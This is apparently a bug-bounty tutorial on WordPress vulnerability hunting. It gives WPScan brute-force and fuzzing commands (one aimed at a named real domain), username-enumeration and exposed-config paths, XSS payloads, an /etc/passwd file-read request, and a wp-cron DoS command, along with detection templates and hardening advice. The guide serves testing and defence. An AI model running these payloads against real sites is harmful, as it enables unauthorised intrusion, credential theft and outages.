

![Preview image](https://miro.medium.com/v2/resize:fit:700/1*QQd3QpCRuYgCANM3IBwutg.png)











# Mastering WordPress Bug Hunting: A Complete Guide for Security Researchers

## Learn step-by-step techniques, tools and strategies to uncover high-impact vulnerabilities in WordPress sites.


### Introduction

WordPress is the world's leading content management system (CMS), powering millions of websites with its versatility and ease of use. But with popularity comes risk. its massive user base makes it an attractive target for hackers. From outdated plugins and poorly coded themes to weak security settings and simple mistakes by administrators, there are many entry points attackers can exploit. In this guide, we'll break down the most common vulnerabilities found in WordPress, explain how attackers take advantage of them and share practical steps to strengthen your site's defenses.

### Understanding WordPress Architecture

To hack WordPress you first need to understand how it's built:

- **Core:** The main WordPress files maintained by the community.
- **Themes:** Control the design but often include PHP/JS code.
- **Plugins:** Extend functionality but are the biggest source of vulnerabilities.

Attackers usually don't target WordPress core instead they exploit **poorly coded plugins or misconfigured themes.**

### Types of WordPress Vulnerabilities to Hunt

Focus on these common flaw categories:

#### A. Core WordPress Vulnerabilities

- **Authentication Bypasses:** Flaws in login mechanisms (e.g., wp-login.php).
- **Privilege Escalation:** Allowing low-privilege users (e.g., subscribers) to gain admin rights.
- **SQL Injection (SQLi):** User input improperly sanitized in database queries.
- **Cross-Site Scripting (XSS):** Malicious scripts injected via comments, posts or user profiles.
- **File Inclusion/Deletion:** Arbitrary file reads/writes (e.g., via wp-admin functions).

#### B. Plugin & Theme Vulnerabilities

- Insecure Direct Object References (IDOR): Accessing unauthorized data by manipulating IDs in URLs (e.g., ?post_id=123).
- CSRF (Cross-Site Request Forgery): Forcing users to execute actions without consent.
- Unrestricted File Uploads: Allowing executable file uploads (e.g., .php, .webshell).
- API Flaws: Weak REST API or GraphQL endpoints exposing sensitive data.
- Settings Injections: Storing XSS payloads in plugin/theme settings.

#### C. Server/Configuration Issues

- XML-RPC Vulnerabilities: Brute-force attacks or pingback abuses.
- Directory Traversal: Accessing files outside the web root (e.g., ../../../../wp-config.php).
- Misconfigured Permissions: Writeable wp-content directories or exposed backups.

### Essential Tools for WordPress Bug Hunting

- **WPScan:** The gold standard for WordPress enumeration (plugins, themes, users, vulnerabilities).

Copy`wpscan --url https://domain.com --api-token YOUR_TOKEN wpscan --url https://domain.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force`

- **Nmap:** Discover open ports and services.

Copy`nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan`

- **DirBuster/ffuf:** Find hidden directories and files (e.g., /wp-content/uploads/, /backup/).

Copy`dirsearch -u https://example.com  --full-url --deep-recursive -r dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1  ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -t 100 -r -o results.json ffuf -w coffin@wp-fuzz.txt -u https://ens.domains/FUZZ  -fc 401,403,404  -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -r -t 60 --rate 100 -c`

[

## payloads/coffin@wp-fuzz.txt at main · coffinxp/payloads

### Contribute to coffinxp/payloads development by creating an account on GitHub.

github.com



](https://github.com/coffinxp/payloads/blob/main/coffin%40wp-fuzz.txt)

### Step-by-Step Bug Hunting Workflow

#### Username Enumeration via REST API

WordPress includes a **REST API** that can expose information about registered users. By default, this API reveals data for all users who have authored at least one public post. This can usually be enumerated through the following endpoint:

Copy`# Default REST API endpoint /wp-json/wp/v2/users  # Common bypasses /wp-json/wp/v2/users/n /wp-json/?rest_route=/wp/v2/users/ /wp-json/?rest_route=/wp/v2/users/n /index.php?rest_route=/wp/v2/users /index.php?rest_route=/wp/v2/users/n  # With query parameters /wp-json/wp/v2/users?page=1 /wp-json/wp/v2/users/?per_page=100 /wp-json/wp/v2/users/?orderby=id&order=asc /wp-json/wp/v2/users?search=admin /wp-json/wp/v2/users?search=editor  # Direct user ID probing /wp-json/wp/v2/users/1 /wp-json/wp/v2/users/2 /wp-json/wp/v2/users/9999  # Legacy or alternative endpoints /wp-json/users /wp-json/wp/v2/users.json /?rest_route=/wp/v2/users /?rest_route=/wp/v2/users/1`

#### Admin panel password Bruteforce

After successfully enumerating all possible usernames using the above techniques, the next step is to attempt **brute-forcing the admin login**. This can be done using the following commands:

Copy`# WPScan brute force (single username) wpscan --url https://target.com --username admin --passwords /path/to/passwords.txt --disable-tls-checks  # WPScan brute force (multiple usernames) wpscan --url https://target.com --usernames /path/to/usernames.txt --passwords /path/to/passwords.txt --disable-tls-checks  # WPScan brute force via XML-RPC wpscan --url https://target.com --usernames admin --passwords /path/to/passwords.txt --disable-tls-checks --max-threads 10`

#### Exposed Configuration Files

A Configuration File Leak happens when sensitive config files are publicly accessible due to misconfigurations. These files often expose database credentials, API keys, and environment variables. In WordPress, leaks of files like wp-config.php, .env or backups (.bak, .save, etc.) can lead to full application and database compromise.

Below are some of the most common paths where sensitive configuration files and backups may be exposed on WordPress sites:

Copy`# Main WordPress configuration file /wp-config.php /wp-config.php.bak /wp-config.php.save /wp-config.php.old /wp-config.php.orig /wp-config.php~  /wp-config.php.txt /wp-config.php.zip /wp-config.php.tar.gz /wp-config.php.backup  # Environment files /.env /.env.bak /.env.old /.env.save /.env.example /.env.local  # Backup & archive leaks /backup.zip /backup.tar.gz /db.sql /database.sql /dump.sql /wordpress.zip /wordpress.tar.gz /website-backup.zip /site-backup.tar.gz  # Other sensitive config files /wp-config-sample.php /.htaccess /.htpasswd /phpinfo.php /config.json /config.php /config.php.bak`

#### Exposed Registration Page

If user registration is enabled via /wp-login.php?action=register, attackers can create accounts without restrictions. This may lead to spam account creation, privilege escalation or abuse if roles are misconfigured.

For mass hunting, you can use the following **Nuclei template** to quickly detect exposed registration pages across multiple targets.

Copy`id: wp-login-register-detect info:   name: Detect WordPress Registration Page   author: yourname   severity: info   description: Checks for WordPress user registration endpoint exposure   tags: wordpress,register,exposure requests:   - method: GET     path:       - "{{BaseURL}}/wp-login.php?action=register"     matchers:       - type: word         words:           - 'user_login'           - 'user_email'         condition: and       - type: status         status:           - 200`

#### Unsecured WordPress Setup Wizard

The endpoint /wp-admin/setup-config.php?step=1 is part of WordPress's installation process. If it remains accessible after deployment, it indicates an incomplete or misconfigured setup. Attackers could potentially re-run the installation wizard, overwrite the configuration and gain full control over the site and its database.

For mass hunting, the following Nuclei template can be used to detect exposed setup pages:

[

## nuclei-templates/wp-setup-config.yaml at main · coffinxp/nuclei-templates

### Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.

github.com



](https://github.com/coffinxp/nuclei-templates/blob/main/wp-setup-config.yaml)

#### Exploiting XML-RPC in WordPress

The xmlrpc.php file in WordPress allows remote procedure calls and is often abused by attackers. If enabled, it can be exploited for brute-force login attempts, DDoS amplification, or even data extraction via methods like system.multicall. While it's a legitimate feature, leaving it exposed without restrictions introduces serious security risks.

You can read my full detailed article on this attack here:

[

## How Hackers Abuse XML-RPC to Launch Bruteforce and DDoS Attacks

### From Recon to full Exploitation: The XML-RPC Attack Path

infosecwriteups.com



](https://infosecwriteups.com/how-hackers-abuse-xml-rpc-to-launch-bruteforce-and-ddos-attacks-40be5b310960)

#### Exploiting Admin-AJAX and Theme/Plugin Endpoints

The admin-ajax.php file is a core WordPress endpoint used by themes and plugins to handle asynchronous requests. If not properly validated, it can expose functionality to unauthenticated users, leading to attacks such as XSS and even Remote Code Execution (RCE) through vulnerable plugins or themes. For example:

XSS attempt:

Copy`domain.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options={'location'%3A'Cairo'%2C'units'%3A'C'%2C'forecast_days'%3A'5<%2Fscript><script>alert(document.domain)<%2Fscript>custom_name'%3A'Cairo'%2C'animated'%3A'true'} domain.com/wp-content/themes/ambience/thumb.php?src=<body onload=prompt(1)>.png`

RCE attempt:

Copy`https://domain.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

#### Exploiting File Inclusion Vulnerabilities

File Inclusion flaws arise when a web application loads files based on user-controlled input. By manipulating parameters, an attacker may trick the application into including arbitrary files from the local server (**LFI — Local File Inclusion**) or from external sources (**RFI — Remote File Inclusion**).

A simple example is when a URL looks like this:

Copy`http://target.com/index.php?page=about.php`

If the input is not properly validated, an attacker could replace about.php with a sensitive file (e.g., /etc/passwd) or even a remote payload, leading to information disclosure or remote code execution. To automate testing, you can fuzz parameters with an **LFI payload list**. For example:

[

## payloads/lfi.txt at main · coffinxp/payloads

### Contribute to coffinxp/payloads development by creating an account on GitHub.

github.com



](https://github.com/coffinxp/payloads/blob/main/lfi.txt)

#### Abusing wp-cron.php for Denial of Service

WordPress uses wp-cron.php to manage scheduled tasks. While visiting it normally shows a blank page, each request triggers background processes. Attackers can abuse this behavior with automated requests to overload the server and cause a Denial of Service (DoS).

Copy`./doser -t 100000 -g "https://target.com/wp-cron.php"`

If flooding the endpoint with around **100k requests** causes the site to return a **500 Internal Server Error** upon refresh, the DoS issue is confirmed.

[

## GitHub - Quitten/doser.go: DoS tool for HTTP requests (inspired by hulk but has more…

### DoS tool for HTTP requests (inspired by hulk but has more functionalities) - Quitten/doser.go

github.com



](https://github.com/Quitten/doser.go)

#### WordPress Subdomain Takeover

Sometimes WordPress subdomains (like blog.target.com or shop.target.com) may still point to old services such as WordPress.com hosting, GitHub Pages or abandoned SaaS platforms. If the DNS record exists but the linked service is no longer claimed, attackers can register the resource and take control of the subdomain leading to defacement, phishing, or further exploitation.

You can automate detection with Nuclei using this template:

[

## nuclei-templates/wordpress-takeover.yaml at main · coffinxp/nuclei-templates

### Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.

github.com



](https://github.com/coffinxp/nuclei-templates/blob/main/wordpress-takeover.yaml)

### Famous & High-Impact WordPress CVEs

Over the years, WordPress and its plugins/themes have been targeted by some of the most critical vulnerabilities. Below is a curated list of the **most famous CVEs** from old legacy flaws to modern-day exploits that every security researcher and site owner should know about.

**You can explore more WordPress CVEs on the official WPScan Vulnerability Database:**

[

## WordPress Vulnerabilities

### Discover the latest WordPress security vulnerabilities. With WPScan's constantly updated database, protect your site…

wpscan.com



](https://wpscan.com/wordpresses/)

### Prevention and Mitigation

Securing WordPress isn't just about finding bugs. it's also about preventing them from being exploited. Below are key steps to harden your installation:

- **Keep WordPress, Plugins & Themes Updated** Regularly patching reduces exposure to known CVEs and zero-days.
- **Remove Unused Plugins & Themes** Every plugin is an extra attack surface. Delete what you don't use.
- Limit Access to Sensitive Files & Endpoints Block public access to /wp-config.php, .env, .htaccess, /xmlrpc.php, /wp-admin/ and /wp-cron.php unless explicitly required.
- **Enforce Strong Authentication** Use strong, unique passwords and enable 2FA for all admin accounts.
- **Rate Limiting & WAF** Protect against brute force, XML-RPC abuse, and DoS with rate limiting rules or a Web Application Firewall (e.g., Cloudflare, ModSecurity).
- Secure Backups Ensure backups are stored outside the web root and not publicly accessible (no /backup.zip leaks).
- **Subdomain & DNS Hygiene** Regularly audit DNS records to prevent **subdomain takeover** risks.

### Conclusion

WordPress bug hunting is a goldmine for security researchers. With millions of websites using vulnerable plugins and themes, opportunities are endless. Whether you're just starting out or already an experienced bug bounty hunter, mastering WordPress vulnerabilities can open doors to bigger payouts and stronger security skills.

**Next Read:** _**Check out Mastering Web Cache Deception Vulnerabilities: An Advanced Bug Hunter's Guide. learn how to exploit cache misconfigurations for hidden data exposure**_ 👇

[

## Mastering Web Cache Deception Vulnerabilities: An Advanced Bug Hunter’s Guide

### Advanced Tactics, Payloads and Real-World Methods to Uncover Hidden Cache Deception Flaws

infosecwriteups.com



](https://infosecwriteups.com/mastering-web-cache-deception-vulnerabilities-an-advanced-bug-hunters-guide-b7b500b482e3)

### Disclaimer

> _The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly_

[#bug-bounty](https://medium.com/tag/bug-bounty "Bug Bounty")[#penetration-testing](https://medium.com/tag/penetration-testing "Penetration Testing")[#cybersecurity](https://medium.com/tag/cybersecurity "Cybersecurity")[#hacking](https://medium.com/tag/hacking "Hacking")[#wordpress](https://medium.com/tag/wordpress "WordPress")